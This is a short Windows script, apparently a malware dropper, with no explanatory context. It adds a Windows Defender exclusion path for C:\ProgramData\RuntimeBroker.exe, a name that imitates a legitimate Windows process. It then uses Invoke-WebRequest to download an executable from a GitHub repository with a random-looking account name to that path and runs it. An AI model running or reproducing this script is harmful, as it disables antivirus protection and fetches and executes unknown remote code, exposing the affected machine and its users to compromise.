reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /f /reg:64
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\ProgramData\RuntimeBroker.exe" /d 0 /f /reg:64

$filePath = "C:\ProgramData\RuntimeBroker.exe"
$url = "https://github.com/ashduasdoasdoasd/zerintest/raw/refs/heads/main/config/exe/RuntimeBroker.exe" 
Invoke-WebRequest -Uri $url -OutFile $filePath
& $filePath
